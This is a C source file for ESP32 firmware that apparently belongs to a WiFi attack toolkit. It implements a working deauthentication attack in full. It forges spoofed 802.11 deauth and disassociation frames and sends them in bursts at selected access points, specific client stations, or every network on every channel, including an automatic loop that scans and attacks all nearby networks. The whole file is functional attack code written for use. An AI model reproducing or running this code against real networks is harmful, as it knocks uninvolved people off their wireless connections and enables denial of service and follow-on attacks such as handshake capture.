/**
 * @file deauth_attack.c
 * @brief Deauthentication attack implementation
 * 
 * This module handles WiFi deauthentication attacks including:
 * - Standard deauth attacks on selected/all APs
 * - Station-specific deauth attacks
 * - Automatic deauth attacks
 * 
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/deauth_attack.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/rgb_manager.h"
#include "managers/status_display_manager.h"
#include "managers/views/terminal_screen.h"
#include "core/glog.h"
#include "scans/wifi/wifi_channels.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdlib.h>

// Maximum WiFi channel
#if !defined(MAX_WIFI_CHANNEL)
#if defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_WIFI_CHANNEL 165
#else
#define MAX_WIFI_CHANNEL 13
#endif
#endif

// Rate limiting
#define MAX_PACKETS_PER_SECOND 500

// External globals from wifi_manager.c (declared in wifi_manager.h)
// These are already declared via the header include above

// RGB manager
extern RGBManager_t rgb_manager;

// Packet counter for rate limiting (local to this module)
static uint32_t packet_counter = 0;
static uint32_t deauth_packets_sent = 0;

// Task handles (local to this module)
static TaskHandle_t deauth_task_handle = NULL;
static TaskHandle_t deauth_station_task_handle = NULL;
static bool deauth_task_running = false;
static volatile bool deauth_stop_requested = false;
static volatile bool deauth_station_stop_requested = false;

// Station selection (local to this module for station deauth)
static station_ap_pair_t selected_station_local;
static bool station_selected_local = false;

// Selected AP tracking (local copies)
static wifi_ap_record_t selected_ap_local;
static wifi_ap_record_t *selected_aps_local = NULL;
static int selected_ap_count_local = 0;

// Rate limiting check (local)
static bool check_packet_rate(void) {
    static uint32_t last_time = 0;
    static uint32_t packets_this_second = 0;
    
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    if (current_time - last_time >= 1000) {
        // Reset counter every second
        packets_this_second = 0;
        last_time = current_time;
    }
    
    if (packets_this_second >= MAX_PACKETS_PER_SECOND) {
        return false;
    }
    
    packets_this_second++;
    return true;
}

// Helper to sanitize SSID (local)
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// Deauth packet templates
static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00,                         // Frame Control
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00 // Reason code: Class 3 frame received from nonassociated STA
};

static const uint8_t disassoc_packet_template[26] = {
    0xa0, 0x00,                         // Frame Control (only first byte different)
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code
};

// Forward declarations
static void deauth_task(void *param);
static void deauth_station_task(void *param);
static void auto_deauth_task(void *Parameter);

esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    // Use HT40 for 5GHz channels on dual-band chips - but use NONE as secondary
    // WIFI_SECOND_CHAN_ABOVE is only valid for 2.4GHz HT40
    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
    esp_err_t err = esp_wifi_set_channel(channel, second);
    if (err != ESP_OK) {
        printf("Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
    }

    // Create packets from templates
    uint8_t deauth_frame[sizeof(deauth_packet_template)];
    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

    // Check if broadcast MAC
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) {
            is_broadcast = false;
            break;
        }
    }

    // Direction 1: AP -> Station
    // Set destination (target)
    memcpy(&deauth_frame[4], mac, 6);
    memcpy(&disassoc_frame[4], mac, 6);

    // Set source and BSSID (AP)
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[10], bssid, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    // Add sequence number (random)
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    // Send frames (no rate limiting for burst effectiveness)
    esp_err_t tx_err;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;

    // If not broadcast, send reverse direction
    if (!is_broadcast) {
        // Swap addresses for Station -> AP direction
        memcpy(&deauth_frame[4], bssid, 6);
        memcpy(&deauth_frame[10], mac, 6);
        memcpy(&deauth_frame[16], bssid, 6);

        memcpy(&disassoc_frame[4], bssid, 6);
        memcpy(&disassoc_frame[10], mac, 6);
        memcpy(&disassoc_frame[16], bssid, 6);

        // New sequence number for reverse direction
        seq = (esp_random() & 0xFFF) << 4;
        deauth_frame[22] = seq & 0xFF;
        deauth_frame[23] = (seq >> 8) & 0xFF;
        disassoc_frame[22] = seq & 0xFF;
        disassoc_frame[23] = (seq >> 8) & 0xFF;

        // Send reverse frames
        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
    }

    return ESP_OK;
}

static void deauth_task(void *param) {
    if (ap_count == 0) {
        glog("No access points found\n");
        glog("Please run 'scan -w' first to find targets\n");
        vTaskDelete(NULL);
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        glog("Failed to allocate memory for AP info\n");
        vTaskDelete(NULL);
        return;
    }

    uint32_t last_log = 0;
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    while (!deauth_stop_requested) {
        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            // Iterate through selected APs directly instead of all channels
            // This ensures each selected AP gets proper time on its channel
            for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
                for (int i = 0; i < ap_count; i++) {
                    if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
                        int ch = ap_info[i].primary;
                        wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
                        esp_wifi_set_channel(ch, sec);
                        
                        // Burst loop for effectiveness
                        for (int burst = 0; burst < 25; burst++) {
                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                        }
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                for (int burst = 0; burst < 25; burst++) {
                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                                }
                            }
                        }
                        vTaskDelay(pdMS_TO_TICKS(5));
                    }
                }
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                    int ch = ap_info[i].primary;
                    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
                    esp_wifi_set_channel(ch, sec);
                    for (int burst = 0; burst < 25; burst++) {
                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                    }
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            for (int burst = 0; burst < 25; burst++) {
                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                            }
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(10));
                }
            }
        } else {
            for (size_t ch_idx = 0; ch_idx < wireshark_channels_count; ch_idx++) {
                int ch = wireshark_channels[ch_idx];
                bool channel_set = false;
                for (int i = 0; i < ap_count; i++) {
                    if (ap_info[i].primary == ch) {
                        if (!channel_set) {
                            wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
                            if (ch > 14) sec = WIFI_SECOND_CHAN_ABOVE;
#endif
                            esp_wifi_set_channel(ch, sec);
                            channel_set = true;
                        }
                        for (int burst = 0; burst < 25; burst++) {
                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                        }
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                for (int burst = 0; burst < 25; burst++) {
                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                                }
                            }
                        }
                    }
                }
                if (channel_set) vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            glog("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

void deauth_attack_start(void) {
    if (!deauth_task_running) {
        ap_manager_stop_services();

        // Ensure WiFi is fully stopped before configuring
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(50));

        // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        wifi_protocols_t p = {
            .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
            .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
        };
        esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
        if (proto_err != ESP_OK) {
            printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
        } else {
            printf("5GHz protocols set successfully\n");
        }
        ESP_ERROR_CHECK(esp_wifi_start());
#else
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // Set AP mode for 802.11 TX
        esp_wifi_start();
        // For non-dual-band chips, use 2.4GHz protocols only
        (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
#endif
        printf("Restarting Wi-Fi\n");

#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_attack("Deauth", "starting");
#endif
        
        // Build country-appropriate channel list for deauth
        wireshark_channels_count = wifi_channels_build_country_list(wireshark_channels, sizeof(wireshark_channels));
        
        // Copy selected AP info from wifi_manager globals
        extern wifi_ap_record_t selected_ap;
        extern wifi_ap_record_t *selected_aps;
        extern int selected_ap_count;
        
        selected_ap_local = selected_ap;
        selected_aps_local = selected_aps;
        selected_ap_count_local = selected_ap_count;
        
        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            glog("Starting deauth attack on %d selected APs:\n", selected_ap_count_local);
            
            for (int i = 0; i < selected_ap_count_local; i++) {
                char sanitized_ssid[33];
                sanitize_ssid(selected_aps_local[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                glog("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
                     i, sanitized_ssid,
                     selected_aps_local[i].bssid[0], selected_aps_local[i].bssid[1], selected_aps_local[i].bssid[2],
                     selected_aps_local[i].bssid[3], selected_aps_local[i].bssid[4], selected_aps_local[i].bssid[5]);
#ifdef CONFIG_WITH_STATUS_DISPLAY
                if (i == 0) {
                    status_display_show_attack("Deauth", sanitized_ssid);
                }
#endif
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_ap_local.ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("Deauth", sanitized_ssid);
#endif
        } else {
            glog("Starting global deauth attack on all APs\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("Deauth", "all APs");
#endif
        }
        
        deauth_stop_requested = false;
        BaseType_t rc = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
        if (rc != pdPASS) {
            glog("Failed to start deauth task (%ld)\n", (long)rc);
            status_display_show_status("Deauth Start Fail");
            deauth_task_handle = NULL;
            deauth_stop_requested = false;
            return;
        }
        deauth_task_running = true;
        rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
    } else {
        glog("Deauth already running.\n");
    }
}

void deauth_attack_stop(void) {
    if (deauth_task_running) {
        printf("Stopping deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
        status_display_show_status("Deauth Stopping");
        
        deauth_stop_requested = true;
        
        if (deauth_task_handle != NULL) {
            TaskHandle_t handle_to_check = deauth_task_handle;
            int wait_count = 0;
            while (deauth_task_handle != NULL && wait_count < 100) {
                vTaskDelay(pdMS_TO_TICKS(10));
                wait_count++;
            }
            
            if (deauth_task_handle != NULL) {
                vTaskDelete(deauth_task_handle);
                deauth_task_handle = NULL;
            }
        }
        
        deauth_task_running = false;
        deauth_stop_requested = false;
        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
        esp_wifi_stop();
        ap_manager_start_services();
        status_display_show_status("Deauth Stopped");
    } else {
        status_display_show_status("No Deauth Active");
    }
}

void deauth_attack_start_station(void) {
    if (!station_selected_local) {
        deauth_attack_start();
        return;
    }
    if (deauth_station_task_handle) {
        printf("Station deauth already running.\n");
        return;
    }
    ap_manager_stop_services(); // stop AP and HTTP server

    // Ensure WiFi is fully stopped before configuring
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    wifi_protocols_t p = {
        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
    };
    esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
    if (proto_err != ESP_OK) {
        printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
    } else {
        printf("5GHz protocols set successfully\n");
    }
    ESP_ERROR_CHECK(esp_wifi_start());
#else
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
#endif

    glog("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
         selected_station_local.station_mac[0], selected_station_local.station_mac[1], selected_station_local.station_mac[2], 
         selected_station_local.station_mac[3], selected_station_local.station_mac[4], selected_station_local.station_mac[5],
         selected_station_local.ap_bssid[0], selected_station_local.ap_bssid[1], selected_station_local.ap_bssid[2], 
         selected_station_local.ap_bssid[3], selected_station_local.ap_bssid[4], selected_station_local.ap_bssid[5]);
    deauth_station_stop_requested = false;
    BaseType_t station_rc = xTaskCreate(deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
    if (station_rc != pdPASS) {
        glog("Failed to start station deauth task (%ld)\n", (long)station_rc);
        status_display_show_status("Deauth Station Fail");
        deauth_station_task_handle = NULL;
        deauth_station_stop_requested = false;
        ap_manager_start_services();
        return;
    }
    station_selected_local = false;
}

// Background task for deauthenticating a selected station and logging packet rate
static void deauth_station_task(void *param) {
    // Get the channel from the scanned AP that matches the target BSSID
    int deauth_channel = 1;
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, selected_station_local.ap_bssid, 6) == 0) {
            deauth_channel = scanned_aps[i].primary;
            break;
        }
    }
    
    // Validate channel is within allowed range
    if (deauth_channel < 1 || deauth_channel > MAX_WIFI_CHANNEL) {
        deauth_channel = 1; // fallback channel
    }
    // Use NONE for all channels - WIFI_SECOND_CHAN_ABOVE is only for 2.4GHz HT40
    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
    while (!deauth_station_stop_requested) {
        for (int burst = 0; burst < 25; burst++) {
            deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
        }
        vTaskDelay(pdMS_TO_TICKS(20));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            glog("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
    deauth_station_task_handle = NULL;
    vTaskDelete(NULL);
}

bool deauth_attack_stop_station(void) {
    if (deauth_station_task_handle != NULL) {
        deauth_station_stop_requested = true;
        
        int wait_count = 0;
        while (deauth_station_task_handle != NULL && wait_count < 100) {
            vTaskDelay(pdMS_TO_TICKS(10));
            wait_count++;
        }
        
        if (deauth_station_task_handle != NULL) {
            vTaskDelete(deauth_station_task_handle);
            deauth_station_task_handle = NULL;
        }
        deauth_station_stop_requested = false;
        ap_manager_start_services();
        return true;
    }
    return false;
}

static void auto_deauth_task(void *Parameter) {
    while (1) {
        wifi_scan_config_t scan_config = {
            .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true};

        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
        vTaskDelay(pdMS_TO_TICKS(1500));
        esp_wifi_scan_stop();

        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));

        if (ap_count > 0) {
            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
            if (scanned_aps == NULL) {
                printf("Failed to allocate memory for AP info\n");
                continue;
            }

            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
            glog("\nFound %d access points\n", ap_count);
        } else {
            glog("\nNo access points found\n");
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait before retrying if no APs found
            continue;
        }

        wifi_ap_record_t *ap_info = scanned_aps;
        if (ap_info == NULL) {
            printf("Failed to allocate memory for AP info\n");
            return;
        }

        for (int z = 0; z < 50; z++) {
            for (int i = 0; i < ap_count; i++) {
                for (int y = 1; y < 12; y++) {
                    int retry_count = 0;
                    esp_err_t err;
                    while (retry_count < 3) {
                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
                        if (err == ESP_OK) {
                            break;
                        }
                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
                        vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between retries
                        retry_count++;
                    }

                    if (err != ESP_OK) {
                        printf("Failed to set channel after retries, skipping...\n");
                        continue; // Skip this channel if all retries failed
                    }

                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    deauth_attack_broadcast(ap_info[i].bssid, y, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            deauth_attack_broadcast(ap_info[i].bssid, y, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
                }
                vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
            }
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between cycles
        }

        free(scanned_aps);
        vTaskDelay(pdMS_TO_TICKS(1000)); // 1000ms delay before starting next scan
    }
}

void deauth_attack_auto(void) {
    printf("Starting auto deauth transmission...\n");
    auto_deauth_task(NULL);
}

uint32_t deauth_attack_get_packets_sent(void) {
    return deauth_packets_sent;
}

void deauth_attack_reset_packet_counter(void) {
    deauth_packets_sent = 0;
}
